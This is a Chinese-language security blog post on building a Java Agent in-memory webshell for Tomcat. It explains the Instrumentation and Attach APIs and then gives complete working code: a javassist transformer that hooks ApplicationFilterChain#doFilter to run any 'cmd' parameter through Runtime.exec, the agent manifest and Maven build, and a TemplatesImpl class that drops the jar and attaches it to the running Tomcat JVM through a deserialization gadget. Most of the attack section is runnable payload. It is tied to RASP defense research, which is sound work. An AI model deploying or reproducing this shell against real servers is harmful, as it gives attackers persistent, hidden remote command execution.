---
title: "Java Agent内存马"
onlyTitle: true
date: 2025-5-12 21:27:06
categories:
- java
- 内存马
tags:
- 内存马
- RASP
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8155.jpg
---



在了解了RASP的基础上，就很容易看懂Agent内存马了

RASP从0到1：https://godownio.github.io/2024/12/30/rasp-de-fang

对应的代码：https://github.com/godownio/RASPAgent

# Java Agent内存马

本文所有代码：https://github.com/godownio/TomcatMemshell

在 jdk 1.5 之后引入了  java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，**通过 java.lang.instrument 实现的工具我们称之为 Java Agent** ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法

Java Agent 支持两种方式进行加载：

* 实现 premain 方法，在启动时进行加载	（该特性在 jdk 1.5 之后才有）
* 实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）

### Instrumentation

不管什么方式加载，其中都会用到一个非常重要的实例，就是Instrumentation

Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果

Instrumentation提供的几个关键函数如下：其中addTransformer、retransformClasses、getAllLoadedClasses我们都在RASP中见过了

```java
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

    ......
}
```

addTransformer增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。

addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。



## premain

premain实现的Java Agent，按照以下过程实现：

* 首先必须实现premain方法，premain里接收Instrumentation。然后可以选择向Instrumentation addTransformer添加一个自定义的Transformer，这样在启动的时候会自动调用到自定义Transformer的transform方法去修改类字节码。

```java
public class Agent {

    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new AgentTransform());
    }
}
```

* jar包文件需要有MF文件，且必须含有Premain-Class属性指定premain所在的类。另外如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true
* 需要在命令行用`-javaagent`实现启动时加载

这里单独说一下第一步具体的自定义Transformer怎么写：

以下均采用流式写法，就是写到一个文件。

```java
public class AgentTransform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) throws IllegalClassFormatException {

        ...

        try {
            ...
                ClassReader classReader  = new ClassReader(classfileBuffer);
                ClassWriter classWriter  = new ClassWriter(classReader, ClassWriter.COMPUTE_MAXS);
                ClassVisitor classVisitor = new  new ClassVisitor(Opcodes.ASM5, classWriter) {
                                @Override
                                public MethodVisitor visitMethod(int i, String s, String s1, String s2, String[] strings) {
                                    final MethodVisitor methodVisitor = super.visitMethod(i, s, s1, s2, strings);

                                    if (...) {
                                        return new MethodVisitor(api, methodVisitor) {
                                            @Override
                                            public void visitCode() {
                                                ...
                                            }
                                        };
                                    }
                                    return methodVisitor;
                                }
                            };

                classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);

                classfileBuffer = classWriter.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return classfileBuffer;
    }
}
```

- 需要实现ClassFileTransformer，重载transform方法。当 JVM 加载某个类时，会调用 `transform` 方法，允许开发者对字节码进行修改。
- 需要访问类，所以声明ClassReader，来获取类
- 需要对类中的内容进行修改，所以声明ClassWriter，该类继承于ClassReader
- 实例化访问者classVisitor来进行类访问，且重载其中的方法来修改字节码：
  - 如果需要访问注解，则实例化`AnnotationVisitor`
  - 如果需要访问参数，则实例化`FieldVisitor`
  - 如果需要访问方法，则实例化`MethodVisitor`
- 最后， *`ClassReader`调用`accept`方法* 完成整个调用流程

上述说的实例化AnnotationVisitor、FieldVisitor、MethodVisitor分别对应ClassVisitor的visitAnnotation、visitField、visitMethod方法。比如你需要Hook类方法，如ProcessBuilder.start，则需要重载visitMethod

premain需要在启动前用`-javaagent`加载，所以内存马是用不到这个的



## agentmain

我们重点关注运行时加载的agentmain

agentmain和premian的实现过程大部分一致：

* 首先必须实现agentmain方法，agentmain和premain参数一致。等下介绍这里添加的自定义Transformer

```java
public class Agent {

    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new AgentTransform());
    }
}
```

* jar包文件需要有MF文件，且必须含有Agent-Class属性指定Agent 入口类。告诉 JVM 在运行时 attach 时，应该加载哪个类来执行 agent 的初始化逻辑。同样的，如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true

* 由于agentmain式Hook是在运行时去attach，在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api，其中最重要的是com.sun.tools.attach.VirtualMachine

VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法：attach，loadAgent 和 detach 

attach方法允许我们传入一个jvm的id，然后远程连接到jvm上。为我们后面调用loadAgent打下铺垫

loadAgent向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例

detach方法从jvm上解除一个agent

这三个VirtualMachine搭配使用，就能完成向运行时的jvm程序attach 一个agent jar。一个attach的代码如下：

```java
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list) {
            if (vmd.displayName().endsWith("MainTest")) {
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                virtualMachine.loadAgent("E:\\CODE_COLLECT\\Idea_java_ProTest\\javawebAgent\\agent\\target\\agent-1.0.0-shaded.jar", "Attach!");
                System.out.println("ok");
                virtualMachine.detach();
            }
        }
    }
```



在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用该 Attach API 动态加载 agent 。然而  Attach API  在 tools.jar 中，windows jvm 启动时是默认不加载该依赖的。

第一个办法：我们在 classpath 中额外进行指定，默认位置就在`System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar")`，也就是jdkhome/lib/tools.jar，在代码中URLClassLoader去加载。

>本来想把tools.jar放在agent.jar中的，但是java不能解析jar中的jar（不支持递归解析）
>
>不过我还想到一个办法，直接在agent.jar以shade模式打包，这样就把tools.jar也打包进去了，不过经过一些复现，目标机器上的 JVM 版本与你打包进去的 `tools.jar` 不一定兼容，容易崩，严重不推荐

似乎ubuntu 和mac 不用特地引入tools.jar，不过为了通用，用上面的方法是最好的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250512154859515.png)



来到更核心的问题：

* agentmain的自定义Transform怎么写？

利用流式写法，以下是一个示例的agentmain Transform，其中transform方法的作用和premain tranform方法一致，都是触发时去进行相应的处理。唯一的不同是，agentmain除了需要addTransformer外，还需要用retransformClasses去重新hook选择到的类，而premain则是直接addTransformer就结束了。

```java
public class CustomClassTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        ...
        ClassReader cr = new ClassReader(classfileBuffer);
        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM5, cw) {
            @Override
            public MethodVisitor visitMethod(int i, final String s, String s1, String s2, String[] strings) {
                final MethodVisitor mv = super.visitMethod(i, s, s1, s2, strings);
                    return new MethodVisitor(Opcodes.ASM5, mv) {
                        @Override
                        public void visitCode() {
                            super.visitCode();
                            ...
                        }
                    };
                return mv;
            }
        };
        cr.accept(cv, ClassReader.EXPAND_FRAMES);
        classfileBuffer = cw.toByteArray();
        return classfileBuffer;
    }

    public void retransform(Instrumentation inst) throws UnmodifiableClassException {
        LinkedList<Class> retransformClasses = new LinkedList<Class>();
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class clazz : loadedClasses) {
            if ("cn.org.javaweb.agent.attach.MainTest".equals(clazz.getName())) {
                if (inst.isModifiableClass(clazz) && !clazz.getName().startsWith("java.lang.invoke.LambdaForm")) {
                    inst.retransformClasses(clazz);
                }
            }
        }
    }
}
```

对应的，在agentmain里手动去调用retransform->retransformClasses

```java
public class attachAgent {

    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
//        for (Class clazz : inst.getAllLoadedClasses()) {
//            System.out.println(clazz.getName());
//        }
        CustomClassTransformer customClassTransformer = new CustomClassTransformer();
        inst.addTransformer(customClassTransformer);
        customClassTransformer.retransform(inst);
    }
}
```

可以很清楚的说，premain和agentmain的区别就在于这个retransformClasses方法，retransformClasses在attach时会自动调用Transform的transform方法

>不过后面我们会提到，除了retransformClasses可以运行时修改类外，redefineClasses也可以进行修改，冰蝎就是用的第二种利用方式，而这两种修改类的方式对应的攻-防都是完全不同的，暂时略过



## Agent内存马实现

Agent内存马一定用的是agentmain，也就是运行时Hook的方式

那么该修改哪个类呢？

首先，选择一个程序必会经过的方法，这样能保证内存马有效。其次，为了方便回显，最好是选择方法体内能访问到request和response的方法。在Tomcat下有个非常合适的方法：ApplicationFilterChain#doFilter，如果这个类被ban了，又知道目标源码，可以选择去Hook Controller、StandardContext.service等，操作空间非常大

同时，为了保证稳定触发，我们的恶意代码应该塞在doFilter的最前面

代码第一步是向目标写jar，如果目标对jar落地有检测那直接G（这时候冰蝎的一种不用上传jar的agent马就非常秀了），修改类字节码用到的javassist库（如果手动调ASM指令也太曹了）

有同学就问了，MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true不是个死条件吗？是啊，但是它是打包在我们自定义的agent.jar中的，而不是要求服务器上必须有该MF

OK，直接给出payload吧

一个自定义的CustomClassTransformer

```java
package agent;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.security.ProtectionDomain;

public class CustomClassTransformer implements ClassFileTransformer {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String classname,
                            Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) throws IllegalClassFormatException {

        // 1. 只处理目标类 "org/apache/catalina/core/ApplicationFilterChain"（注意路径格式是 / 分隔）
        if (classname.equals("org/apache/catalina/core/ApplicationFilterChain")) {

            // 2. 初始化 Javassist 类池
            ClassPool pool = ClassPool.getDefault();
            pool.appendClassPath(new LoaderClassPath(loader)); // 添加当前 ClassLoader 的路径

            try {
                // 3. 从原始字节码构建 CtClass 对象
                CtClass cc = pool.makeClass(new ByteArrayInputStream(classfileBuffer));

                // 4. 获取目标方法 doFilter()
                CtMethod doFilter = cc.getDeclaredMethod("doFilter");

                // 5. 在 doFilter() 方法开头插入代码
                doFilter.insertBefore(
                        "javax.servlet.http.HttpServletRequest req =  request;\n" +
                                "javax.servlet.http.HttpServletResponse res = response;\n" +
                                "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                                "if (cmd != null){\n" +
                                "    try {\n" +
                                "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                                "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                                "        String line;\n" +
                                "        StringBuilder sb = new StringBuilder(\"\");\n" +
                                "        while ((line=reader.readLine()) != null){\n" +
                                "            sb.append(line).append(\"\\n\");\n" +
                                "        }\n" +
                                "        response.getOutputStream().print(sb.toString());\n" +
                                "        response.getOutputStream().flush();\n" +
                                "        response.getOutputStream().close();\n" +
                                "    } catch (Exception e){\n" +
                                "        e.printStackTrace();\n" +
                                "    }\n" +
                                "}");
                // 6. 返回修改后的字节码
                return cc.toBytecode();

            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        return new byte[0];
    }

    public void retransform(Instrumentation inst) throws UnmodifiableClassException {
        inst.addTransformer(new CustomClassTransformer(), true);
        for (Class<?> clazz : inst.getAllLoadedClasses()) {
            if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                try {
                    inst.retransformClasses(clazz);
                } catch (UnmodifiableClassException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
}
```

一个调用该transform.retransform的agentmain

```java
package agent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class attachAgent {

    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        CustomClassTransformer customClassTransformer = new CustomClassTransformer();
        customClassTransformer.retransform(inst);
    }
}
```

一个MF文件：

```MF
Manifest-Version: 1.0
Agent-Class: agent.attachAgent
Can-Retransform-Classes: true
Can-Redefine-Classes: true
Can-Set-Native-Method-Prefix: true

```

pom.xml将以上三个文件打包成shade-jar，shade模式下会把javassist依赖也打包进去

```java
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>cn.org.javaweb</groupId>
    <artifactId>AgentJAR</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.21.0-GA</version>
        </dependency>
        <dependency>
            <groupId>com.sun</groupId>
            <artifactId>tools</artifactId>
            <systemPath>${project.basedir}/lib/tools.jar</systemPath>
            <version>1.8</version>
            <scope>system</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>2.3.2</version>
                <configuration>
                    <archive>
                        <manifestFile>src/main/resources/MANIFEST.MF</manifestFile>
                    </archive>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-shade-plugin</artifactId>
                <version>2.3</version>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>shade</goal>
                        </goals>
                        <configuration>
                            <artifactSet>
                                <includes>
                                    <include>org.javassist:javassist:jar:*</include>
                                </includes>
                            </artifactSet>
                        </configuration>
                    </execution>
                </executions>
                <dependencies>
                    <dependency>
                        <groupId>com.sun</groupId>
                        <artifactId>tools</artifactId>
                        <systemPath>${project.basedir}/lib/tools.jar</systemPath>
                        <version>1.8</version>
                        <scope>system</scope>
                    </dependency>
                </dependencies>
            </plugin>
        </plugins>
    </build>

</project>
```

这样我们的jar就制作好了

用TemplatesImpl字节码完成写jar和注入：

注意Tomcat环境下web jvm默认为`org.apache.catalina.startup.Bootstrap`

```java
package org.example.tomcatmemshell.Agent;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;


public class AgentMemShell extends AbstractTranslet {
    public static String filename = "agentJAR.jar";
    public static String agentJAR_PATH = "E:\\CODE_COLLECT\\Idea_java_ProTest\\TomcatMemshell\\src\\main\\java\\org\\example\\tomcatmemshell\\Agent\\AgentJAR-1.0-SNAPSHOT.jar";
    public AgentMemShell(){
        try{
            String JarBaseString =  encodeFileToBase64(agentJAR_PATH);
            String JarPath = getJARFile(JarBaseString);//写Jar文件
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("org.apache.catalina.startup.Bootstrap")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{JarPath});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }


        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public  static  String getJARFile(String base64) throws IOException {
        if (base64 != null) {
            File JarDir = new File(System.getProperty("java.io.tmpdir"), "jar-lib");

            if (!JarDir.exists()) {
                JarDir.mkdir();
            }

            File jarFile =  new File(JarDir, filename);

            // 先删除已存在的 DLL 文件
            if (jarFile.exists()) {
                jarFile.delete();
            }

            byte[] bytes = Base64.getDecoder().decode(base64);
            if (bytes != null) {
                try (FileOutputStream fos = new FileOutputStream(jarFile)) {
                    fos.write(bytes);
                    fos.flush();
                }
            }
            return jarFile.getAbsolutePath();
        }
        return "";
    }
    public static String encodeFileToBase64(String filePath) throws IOException {
        byte[] fileBytes = Files.readAllBytes(Paths.get(filePath));
        return Base64.getEncoder().encodeToString(fileBytes);
    }
}

```

漏洞环境：https://github.com/godownio/TomcatMemshell

在上面项目的VulnServlet路由中，用同项目的CC3TemplatesImpl完成注入

千万要注意，不要多次注入，重复attach会导致内存马失效，打一次然后就去掉payload，只打回显命令，如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250512211759824.png)

windows输出中文会有bug。不管了


不过因为回显在doFilter里提前写到response中返回，导致后续业务无法正常触发，很大概率会把业务打崩。而且操作的时候可能会重复attach导致代码重复，业务崩溃。

另外的，由于agent attach到jvm上，而目标可能有多个jvm在运行，而我们又无从得知jvm程序名，导致只有两种办法，一种是向所有jvm attach，一种是先打另外一种内存马，然后挂agent内存马做隐蔽。这是否有点。。



REF：

https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#

